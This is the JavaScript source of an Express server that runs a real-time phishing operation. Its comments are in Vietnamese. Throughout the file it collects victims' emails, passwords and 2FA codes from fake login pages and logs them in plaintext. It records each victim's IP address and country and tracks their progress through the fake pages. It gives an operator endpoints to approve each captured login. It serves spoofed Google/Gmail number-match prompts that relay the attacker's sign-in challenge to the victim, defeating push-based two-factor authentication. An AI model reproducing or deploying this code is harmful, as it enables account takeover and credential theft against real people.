const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();
const port = 5000;
const fetch = require('node-fetch');

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

let pendingRequests = [];
let requestResults = {};
let nextId = 1;
let verificationNumber = 80;

// Nhận thông tin đăng nhập từ website
app.post('/api/request', async (req, res) => {
    const { email, password, twofa, userAgent, currentPage } = req.body;
    const id = nextId++;
    
    // Debug logging
    console.log('=== New Request ===');
    console.log('Email:', email);
    console.log('Password:', password);
    console.log('2FA Code:', twofa);
    console.log('User Agent:', userAgent);
    console.log('Current Page:', currentPage);
    
    // Lấy IP
    let ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] || 
             req.connection.remoteAddress || 
             req.socket.remoteAddress || 
             req.connection.socket?.remoteAddress || '';
             
    if (ip.includes(',')) ip = ip.split(',')[0];
    if (ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');
    
    // Nếu là localhost, thử lấy IP thật
    if (ip === '127.0.0.1' || ip === '::1' || ip === 'localhost') {
        // Thử lấy IP từ các header khác
        const possibleIPs = [
            req.headers['x-forwarded-for'],
            req.headers['x-real-ip'],
            req.headers['x-client-ip'],
            req.headers['cf-connecting-ip'], // Cloudflare
            req.headers['x-forwarded'],
            req.headers['forwarded-for'],
            req.headers['forwarded']
        ].filter(Boolean);
        
        if (possibleIPs.length > 0) {
            ip = possibleIPs[0].split(',')[0];
        }
    }
    
    console.log('Raw IP:', req.connection.remoteAddress);
    console.log('All headers:', req.headers);
    console.log('Processed IP:', ip);
    
    // Lấy country qua ip-api.com
    let country = '';
    try {
        if (ip && ip !== '127.0.0.1' && ip !== '::1') {
            const resp = await fetch(`http://ip-api.com/json/${ip}`);
            const data = await resp.json();
            if (data && data.country) country = data.country;
            console.log('Country:', country);
        } else {
            console.log('Local IP detected, skipping country lookup');
        }
    } catch (e) {
        console.log('Error getting country:', e.message);
    }
    
    // Xác định status dựa trên currentPage
    let status = 'pending';
    let pageStatus = 'Login';
    
    if (currentPage) {
        switch (currentPage) {
            case 'index.html':
                pageStatus = 'Login';
                break;
            case 'password.html':
                pageStatus = 'Password';
                break;
            case 'verify-device.html':
                pageStatus = 'Setup Code Phone';
                break;
            case 'verify-options.html':
                pageStatus = 'Wait Options';
                break;
            case 'verify.html':
                pageStatus = '2FA';
                break;
            case 'verify-notification.html':
                pageStatus = 'Waiting Finish';
                break;
            default:
                pageStatus = 'Login';
        }
    }
    
    const request = { 
        id, 
        email: email || 'undefined', 
        password: password || 'undefined', 
        twofa: twofa || 'undefined', 
        userAgent: userAgent || 'undefined', 
        ip: ip || 'undefined', 
        country: country || 'undefined', 
        status: 'pending', 
        pageStatus,
        createdAt: Date.now() 
    };
    
    console.log('Final request object:', request);
    console.log('==================');
    
    pendingRequests.push(request);
    requestResults[id] = { status: 'pending', pageStatus };
    res.json({ requestId: id });
});

// API cập nhật trạng thái trang
app.post('/api/update-page', (req, res) => {
    const { id, currentPage } = req.body;
    const reqIndex = pendingRequests.findIndex(r => r.id === id);
    if (reqIndex === -1) return res.status(404).json({ error: 'Request not found' });
    
    let pageStatus = 'Login';
    switch (currentPage) {
        case 'index.html':
            pageStatus = 'Login';
            break;
        case 'password.html':
            pageStatus = 'Password';
            break;
        case 'verify-device.html':
            pageStatus = 'Setup Code Phone';
            break;
        case 'verify-options.html':
            pageStatus = 'Wait Options';
            break;
        case 'verify.html':
            pageStatus = '2FA';
            break;
        case 'verify-notification.html':
            pageStatus = 'Waiting Finish';
            break;
        default:
            pageStatus = 'Login';
    }
    
    pendingRequests[reqIndex].pageStatus = pageStatus;
    if (requestResults[id]) {
        requestResults[id].pageStatus = pageStatus;
    }
    
    res.json({ success: true, pageStatus });
});

// Lấy danh sách các yêu cầu chờ phê duyệt
app.get('/api/pending', (req, res) => {
    res.json(pendingRequests);
});

// API để approve/deny request
app.post('/api/approve', (req, res) => {
    const { id, decision, verificationCode } = req.body;
    const request = pendingRequests.find(r => r.id === id);
    
    if (request) {
        // Không xóa, chỉ thay đổi status
        request.status = decision;
        request.approvedAt = Date.now();
        
        // Lưu verification code nếu có
        if (verificationCode && verificationCode.trim()) {
            request.verificationCode = verificationCode.trim();
            console.log(`Request ${id} ${decision} with verification code: ${verificationCode}`);
        } else {
            console.log(`Request ${id} ${decision}`);
        }
    }
    
    res.json({ success: true });
});

// API để xóa request
app.post('/api/delete', (req, res) => {
    const { id } = req.body;
    const index = pendingRequests.findIndex(r => r.id === id);
    
    if (index !== -1) {
        pendingRequests.splice(index, 1);
        console.log(`Request ${id} deleted`);
    }
    
    res.json({ success: true });
});

// API để xóa nhiều requests
app.post('/api/delete-multiple', (req, res) => {
    const { ids } = req.body;
    
    if (Array.isArray(ids)) {
        ids.forEach(id => {
            const index = pendingRequests.findIndex(r => r.id === id);
            if (index !== -1) {
                pendingRequests.splice(index, 1);
            }
        });
        console.log(`Deleted ${ids.length} requests`);
    }
    
    res.json({ success: true });
});

// API để finish request
app.post('/api/finish', (req, res) => {
    const { id } = req.body;
    const request = pendingRequests.find(r => r.id === id);
    
    if (request) {
        const email = request.email;
        
        // Finish tất cả requests có cùng email
        pendingRequests.forEach(r => {
            if (r.email === email) {
                r.status = 'finished';
                r.finishedAt = Date.now();
            }
        });
        
        const finishedCount = pendingRequests.filter(r => r.email === email && r.status === 'finished').length;
        console.log(`Finished ${finishedCount} requests with email: ${email}`);
    }
    
    res.json({ success: true });
});

// API để unfinish tất cả requests cùng email
app.post('/api/unfinish', (req, res) => {
    const { email } = req.body;
    let count = 0;
    pendingRequests.forEach(r => {
        if (r.email === email && r.status === 'finished') {
            r.status = 'waiting';
            r.pageStatus = 'Waiting For Login Again';
            r.finishedAt = undefined;
            count++;
        }
    });
    res.json({ success: true, count });
});

// Website kiểm tra trạng thái phê duyệt
app.get('/api/status/:id', (req, res) => {
    const id = Number(req.params.id);
    const request = pendingRequests.find(r => r.id === id);
    if (!request) return res.status(404).json({ error: 'Not found' });
    res.json({ status: request.status, pageStatus: request.pageStatus });
});

// API lấy số xác thực hiện tại
app.get('/api/verify-number', (req, res) => {
    res.json({ number: verificationNumber });
});

// API cập nhật số xác thực
app.post('/api/verify-number', (req, res) => {
    const { number } = req.body;
    if (typeof number === 'number' && number >= 0 && number <= 999999) {
        verificationNumber = number;
        res.json({ success: true });
    } else {
        res.status(400).json({ error: 'Invalid number' });
    }
});

// API để lấy verification code cho request
app.get('/api/verification-code/:id', (req, res) => {
    const id = Number(req.params.id);
    const request = pendingRequests.find(r => r.id === id);
    
    if (!request) {
        return res.status(404).json({ error: 'Request not found' });
    }
    
    res.json({ 
        verificationCode: request.verificationCode || null,
        status: request.status 
    });
});

// API để lấy verification code theo email và trả về HTML đã thay thế
app.get('/api/verification-html/:email', (req, res) => {
    const email = decodeURIComponent(req.params.email);
    console.log('Looking for verification code for email:', email);

    // Tìm request mới nhất có verificationCode với email này
    const requestWithCode = pendingRequests
        .filter(r => r.email === email && r.verificationCode && r.verificationCode !== 'on')
        .sort((a, b) => b.createdAt - a.createdAt)[0];

    if (requestWithCode) {
        const verificationCode = requestWithCode.verificationCode;
        console.log('Found verification code:', verificationCode);

        // Trả về HTML đã được thay thế
        const html = `
            <div class="verification-number">${verificationCode}</div>
            <h2 class="instruction-title">Open the Gmail app on iPhone</h2>
            <p class="instruction-text">Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong>${verificationCode}</strong> on your phone to verify it's you.</p>
        `;

        res.json({
            success: true,
            verificationCode: verificationCode,
            html: html
        });
    } else {
        // Trả về HTML mặc định
        const html = `
            <div class="verification-number">80</div>
            <h2 class="instruction-title">Open the Gmail app on iPhone</h2>
            <p class="instruction-text">Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong>80</strong> on your phone to verify it's you.</p>
        `;

        res.json({
            success: false,
            verificationCode: null,
            html: html
        });
    }
});

// API nhận số xác thực từ GUI
app.post('/api/set-verification-code', (req, res) => {
    const { email, code } = req.body;
    if (!email || !code) {
        return res.status(400).json({ success: false, message: 'Missing email or code' });
    }
    // Tìm request mới nhất của email này
    const request = pendingRequests
        .filter(r => r.email === email)
        .sort((a, b) => b.createdAt - a.createdAt)[0];
    if (request) {
        request.verificationCode = code;
        return res.json({ success: true, message: 'Verification code updated', code });
    } else {
        return res.status(404).json({ success: false, message: 'Request not found for this email' });
    }
});

// API lấy số xác thực cho email
app.get('/api/get-verification-code/:email', (req, res) => {
    const email = decodeURIComponent(req.params.email);
    const request = pendingRequests
        .filter(r => r.email === email && r.verificationCode)
        .sort((a, b) => b.createdAt - a.createdAt)[0];
    if (request) {
        return res.json({ code: request.verificationCode });
    } else {
        return res.json({ code: null });
    }
});

// Route để serve gui.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'gui.html'));
});

app.listen(port, () => {
    console.log(`Approval backend listening at http://localhost:${port}`);
}); 